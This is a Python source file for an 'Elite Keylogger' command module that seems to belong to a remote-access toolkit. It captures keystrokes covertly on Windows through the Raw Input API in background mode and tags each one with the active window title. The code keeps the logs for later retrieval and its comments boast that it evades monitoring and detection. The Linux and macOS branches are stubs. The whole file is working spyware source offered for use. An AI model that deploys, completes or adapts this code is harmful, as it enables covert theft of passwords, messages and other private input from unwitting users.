#!/usr/bin/env python3
"""
Elite Keylogger Command - Advanced keystroke logging using Raw Input API
Uses direct API calls, no subprocess, minimal detection footprint
"""

import ctypes
import sys
import os
import time
import threading
import json
from ctypes import wintypes
from datetime import datetime

# Global keylogger state
_keylogger_active = False
_keylogger_thread = None
_keylog_data = []
_keylog_lock = threading.Lock()

def elite_keylogger(action="start", duration=None):
    """
    Advanced keylogger using Raw Input API:
    - Windows: Raw Input API (bypasses some monitoring)
    - Linux: /dev/input/event* devices
    - macOS: Core Graphics event taps
    - Actions: start, stop, status, get_logs
    """
    
    global _keylogger_active, _keylogger_thread
    
    try:
        if action == "start":
            if _keylogger_active:
                return {
                    "success": False,
                    "error": "Keylogger already running",
                    "status": "already_active"
                }
            
            # Start keylogger
            if os.name == 'nt':
                success = _start_keylogger_windows(duration)
            elif sys.platform == 'darwin':
                success = _start_keylogger_macos(duration)
            else:
                success = _start_keylogger_linux(duration)
            
            if success:
                return {
                    "success": True,
                    "action": "start",
                    "status": "active",
                    "duration": duration
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to start keylogger",
                    "status": "failed"
                }
        
        elif action == "stop":
            if not _keylogger_active:
                return {
                    "success": False,
                    "error": "Keylogger not running",
                    "status": "not_active"
                }
            
            _stop_keylogger()
            
            return {
                "success": True,
                "action": "stop",
                "status": "stopped"
            }
        
        elif action == "status":
            return {
                "success": True,
                "action": "status",
                "active": _keylogger_active,
                "log_count": len(_keylog_data),
                "thread_alive": _keylogger_thread.is_alive() if _keylogger_thread else False
            }
        
        elif action == "get_logs":
            with _keylog_lock:
                logs = _keylog_data.copy()
            
            return {
                "success": True,
                "action": "get_logs",
                "log_count": len(logs),
                "logs": logs
            }
        
        elif action == "clear_logs":
            with _keylog_lock:
                _keylog_data.clear()
            
            return {
                "success": True,
                "action": "clear_logs",
                "status": "cleared"
            }
        
        else:
            return {
                "success": False,
                "error": f"Unknown action: {action}",
                "valid_actions": ["start", "stop", "status", "get_logs", "clear_logs"]
            }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": action
        }

def _start_keylogger_windows(duration):
    """Start Windows keylogger using Raw Input API"""
    global _keylogger_active, _keylogger_thread
    
    def keylogger_worker():
        global _keylogger_active
        
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        try:
            # Register for Raw Input
            RIDEV_INPUTSINK = 0x00000100
            
            class RAWINPUTDEVICE(ctypes.Structure):
                _fields_ = [
                    ("usUsagePage", ctypes.c_ushort),
                    ("usUsage", ctypes.c_ushort),
                    ("dwFlags", wintypes.DWORD),
                    ("hwndTarget", wintypes.HWND)
                ]
            
            rid = RAWINPUTDEVICE()
            rid.usUsagePage = 0x01  # Generic Desktop
            rid.usUsage = 0x06      # Keyboard
            rid.dwFlags = RIDEV_INPUTSINK
            rid.hwndTarget = None
            
            if not user32.RegisterRawInputDevices(
                ctypes.byref(rid), 1, ctypes.sizeof(RAWINPUTDEVICE)
            ):
                print("Failed to register raw input device")
                return
            
            # Message loop
            start_time = time.time()
            
            while _keylogger_active:
                if duration and (time.time() - start_time) > duration:
                    break
                
                # Process messages
                msg = wintypes.MSG()
                result = user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1)  # PM_REMOVE
                
                if result:
                    if msg.message == 0x00FF:  # WM_INPUT
                        _process_raw_input(msg.lParam)
                    
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageW(ctypes.byref(msg))
                
                time.sleep(0.01)  # Small delay
        
        except Exception as e:
            print(f"Keylogger worker error: {e}")
        
        finally:
            _keylogger_active = False
    
    try:
        _keylogger_active = True
        _keylogger_thread = threading.Thread(target=keylogger_worker, daemon=True)
        _keylogger_thread.start()
        
        return True
    
    except Exception as e:
        print(f"Failed to start Windows keylogger: {e}")
        _keylogger_active = False
        return False

def _process_raw_input(lParam):
    """Process Raw Input message"""
    user32 = ctypes.windll.user32
    
    try:
        # Get raw input data size
        size = ctypes.c_uint()
        user32.GetRawInputData(
            lParam, 0x10000003, None, ctypes.byref(size), ctypes.sizeof(ctypes.c_uint) * 5
        )
        
        # Get raw input data
        buffer = ctypes.create_string_buffer(size.value)
        user32.GetRawInputData(
            lParam, 0x10000003, buffer, ctypes.byref(size), ctypes.sizeof(ctypes.c_uint) * 5
        )
        
        # Parse RAWINPUT structure (simplified)
        # This is a complex structure - simplified version
        if size.value >= 24:  # Minimum RAWINPUT size
            # Extract keyboard data
            # Offset 16: keyboard message
            # Offset 20: virtual key code
            # Offset 22: scan code
            # Offset 24: flags
            
            vkey = int.from_bytes(buffer[20:22], 'little')
            scan_code = int.from_bytes(buffer[22:24], 'little')
            flags = int.from_bytes(buffer[24:26], 'little')
            
            # Check if key is pressed (not released)
            if flags & 0x01 == 0:  # RI_KEY_MAKE
                _log_keystroke(vkey, scan_code)
    
    except Exception as e:
        print(f"Raw input processing error: {e}")

def _log_keystroke(vkey, scan_code):
    """Log a keystroke"""
    global _keylog_data, _keylog_lock
    
    try:
        # Convert virtual key to character
        key_name = _vkey_to_string(vkey)
        
        # Get current window title
        window_title = _get_active_window_title()
        
        # Create log entry
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "vkey": vkey,
            "scan_code": scan_code,
            "key": key_name,
            "window": window_title
        }
        
        with _keylog_lock:
            _keylog_data.append(log_entry)
            
            # Limit log size
            if len(_keylog_data) > 10000:
                _keylog_data = _keylog_data[-5000:]  # Keep last 5000 entries
    
    except Exception as e:
        print(f"Keystroke logging error: {e}")

def _vkey_to_string(vkey):
    """Convert virtual key code to string"""
    # Common virtual key codes
    vkey_map = {
        0x08: '[BACKSPACE]',
        0x09: '[TAB]',
        0x0D: '[ENTER]',
        0x10: '[SHIFT]',
        0x11: '[CTRL]',
        0x12: '[ALT]',
        0x1B: '[ESC]',
        0x20: ' ',
        0x21: '[PAGEUP]',
        0x22: '[PAGEDOWN]',
        0x23: '[END]',
        0x24: '[HOME]',
        0x25: '[LEFT]',
        0x26: '[UP]',
        0x27: '[RIGHT]',
        0x28: '[DOWN]',
        0x2E: '[DELETE]',
    }
    
    if vkey in vkey_map:
        return vkey_map[vkey]
    elif 0x30 <= vkey <= 0x39:  # Numbers 0-9
        return chr(vkey)
    elif 0x41 <= vkey <= 0x5A:  # Letters A-Z
        return chr(vkey).lower()
    elif 0x60 <= vkey <= 0x69:  # Numpad 0-9
        return str(vkey - 0x60)
    else:
        return f'[VK_{vkey:02X}]'

def _get_active_window_title():
    """Get title of currently active window"""
    if os.name == 'nt':
        try:
            user32 = ctypes.windll.user32
            
            # Get foreground window
            hwnd = user32.GetForegroundWindow()
            
            if hwnd:
                # Get window title
                length = user32.GetWindowTextLengthW(hwnd)
                if length > 0:
                    buffer = ctypes.create_unicode_buffer(length + 1)
                    user32.GetWindowTextW(hwnd, buffer, length + 1)
                    return buffer.value
        except:
            pass
    
    return "Unknown"

def _start_keylogger_linux(duration):
    """Start Linux keylogger using /dev/input/event*"""
    global _keylogger_active, _keylogger_thread
    
    def keylogger_worker():
        global _keylogger_active
        
        try:
            # Find keyboard devices
            keyboard_devices = []
            
            for i in range(32):  # Check event0 through event31
                device_path = f'/dev/input/event{i}'
                if os.path.exists(device_path):
                    try:
                        # Check if it's a keyboard device
                        with open(device_path, 'rb') as f:
                            # Try to read - if it works, it might be a keyboard
                            keyboard_devices.append(device_path)
                    except:
                        continue
            
            if not keyboard_devices:
                print("No keyboard devices found")
                return
            
            # Monitor keyboard devices
            start_time = time.time()
            
            for device in keyboard_devices:
                try:
                    with open(device, 'rb') as f:
                        while _keylogger_active:
                            if duration and (time.time() - start_time) > duration:
                                break
                            
                            # Read input event (simplified)
                            # Real implementation would parse input_event structure
                            data = f.read(24)  # sizeof(struct input_event)
                            if len(data) == 24:
                                # Parse event (simplified)
                                # Would need proper struct parsing
                                pass
                            
                            time.sleep(0.01)
                except:
                    continue
        
        except Exception as e:
            print(f"Linux keylogger error: {e}")
        
        finally:
            _keylogger_active = False
    
    try:
        _keylogger_active = True
        _keylogger_thread = threading.Thread(target=keylogger_worker, daemon=True)
        _keylogger_thread.start()
        
        return True
    
    except Exception as e:
        print(f"Failed to start Linux keylogger: {e}")
        _keylogger_active = False
        return False

def _start_keylogger_macos(duration):
    """Start macOS keylogger using Core Graphics"""
    # macOS keylogging requires special permissions
    # This is a placeholder implementation
    
    return {
        "success": False,
        "error": "macOS keylogging requires accessibility permissions",
        "status": "not_implemented"
    }

def _stop_keylogger():
    """Stop the keylogger"""
    global _keylogger_active
    
    _keylogger_active = False
    
    if _keylogger_thread and _keylogger_thread.is_alive():
        _keylogger_thread.join(timeout=5)

def elite_stopkeylogger():
    """Stop keylogger - separate function for compatibility"""
    return elite_keylogger("stop")

def elite_keylogger_get_logs():
    """Get keylogger logs - separate function for compatibility"""
    return elite_keylogger("get_logs")

if __name__ == "__main__":
    # Test the elite keylogger command
    print("Testing Elite Keylogger Command...")
    
    # Test status
    result = elite_keylogger("status")
    print(f"Initial status: Active={result.get('active', False)}")
    
    # Test start
    print("\nStarting keylogger for 5 seconds...")
    result = elite_keylogger("start", duration=5)
    
    if result["success"]:
        print(f"✓ Keylogger started")
        print(f"  Duration: {result.get('duration', 'unlimited')} seconds")
        
        # Wait for it to run
        time.sleep(6)
        
        # Check status
        result = elite_keylogger("status")
        print(f"Status after 6 seconds: Active={result.get('active', False)}")
        
        # Get logs
        result = elite_keylogger("get_logs")
        if result["success"]:
            print(f"✓ Retrieved {result['log_count']} keystrokes")
            
            if result['logs']:
                print("Sample keystrokes:")
                for log in result['logs'][:5]:
                    print(f"  {log['timestamp']}: {log['key']} (Window: {log['window']})")
        
        # Stop keylogger
        result = elite_keylogger("stop")
        if result["success"]:
            print("✓ Keylogger stopped")
    else:
        print(f"✗ Failed to start keylogger: {result['error']}")
        
        if os.name == 'nt':
            print("  Tip: Run as Administrator for Raw Input API access")
        else:
            print("  Tip: Run as root for input device access")